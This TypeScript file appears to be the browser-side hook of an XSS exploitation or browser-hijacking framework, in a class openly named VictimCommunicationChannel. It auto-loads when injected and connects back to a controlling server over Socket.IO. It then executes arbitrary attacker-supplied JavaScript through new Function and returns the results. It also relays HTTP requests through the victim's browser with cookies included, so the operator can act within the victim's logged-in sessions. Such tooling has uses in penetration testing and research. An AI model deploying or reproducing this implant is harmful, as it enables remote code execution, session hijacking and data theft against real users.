import { CommunicationChannel } from './communication-channel.js';
import { SocketMessage, ProxyResponse } from '../types/index.js';

class VictimCommunicationChannel extends CommunicationChannel {
  constructor(serverUrl: string, sessionId: string) {
    super(serverUrl, sessionId);
  }

  protected onConnect(): void {
    super.onConnect();
    this.socket.emit('victim-connect', { 
      origin: window.location.origin 
    });
  }

  protected onMessage(message: SocketMessage): void {
    if (message.type === 'eval' && 'code' in message && 'id' in message) {
      this.handleEval(message.code as string, message.id as string);
    } else if (message.type === 'request' && 'url' in message) {
      this.handleHttpRequest(message);
    }
  }

  private handleEval(code: string, id: string): void {
    try {
      // Create a function from the code and execute it
      const executeFunction = new Function('send', code);
      
      const sendResult = (data: any) => {
        this.send({
          type: 'eval-result',
          data,
          id
        });
      };
      
      executeFunction(sendResult);
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      this.send({
        type: 'eval-result',
        data: { error: errorMessage },
        id
      });
    }
  }

  private async handleHttpRequest(message: SocketMessage): Promise<void> {
    try {
      const { url, headers, method, body, id } = message;
      
      const fetchHeaders = new Headers();
      if (headers) {
        Object.entries(headers as Record<string, string>).forEach(([key, value]) => {
          fetchHeaders.set(key, value);
        });
      }

      const requestMethod = (method as string).toUpperCase();
      
      const response = await fetch(url as string, {
        headers: fetchHeaders,
        credentials: 'include',
        method: requestMethod,
        body: (requestMethod !== 'GET' && requestMethod !== 'HEAD' && body) 
          ? this.hexToArrayBuffer(body as string) 
          : undefined,
      });

      const responseHeaders: Record<string, string> = {};
      response.headers.forEach((value, key) => {
        responseHeaders[key] = value;
      });

      const responseBody = this.arrayBufferToHex(await response.arrayBuffer());

      const proxyResponse: ProxyResponse = {
        status: response.status,
        statusText: response.statusText,
        headers: responseHeaders,
        body: responseBody
      };

      this.send({
        type: 'response',
        id: id as string,
        response: proxyResponse
      });
      
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      this.send({
        type: 'response',
        id: message.id as string,
        response: {
          status: 500,
          statusText: 'Internal Error',
          headers: {},
          body: this.arrayBufferToHex(new TextEncoder().encode(errorMessage).buffer)
        }
      });
    }
  }

  private arrayBufferToHex(buffer: ArrayBuffer): string {
    const uint8Array = new Uint8Array(buffer);
    return Array.from(uint8Array)
      .map(byte => ('00' + byte.toString(16)).slice(-2))
      .join('');
  }

  private hexToArrayBuffer(hex: string): ArrayBuffer {
    const matches = hex.match(/.{1,2}/g) || [];
    const uint8Array = new Uint8Array(matches.map(byte => parseInt(byte, 16)));
    return uint8Array.buffer;
  }
}

// Auto-initialize when script loads
(() => {
  const currentScript = document.currentScript as HTMLScriptElement;
  if (!currentScript) return;

  const sessionId = currentScript.src.split('?')[1];
  if (!sessionId) return;

  // Load Socket.IO client
  const socketScript = document.createElement('script');
  socketScript.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
  socketScript.onload = () => {
    // Initialize victim communication channel
    new VictimCommunicationChannel(window.location.origin, sessionId);
  };
  document.head.appendChild(socketScript);
})();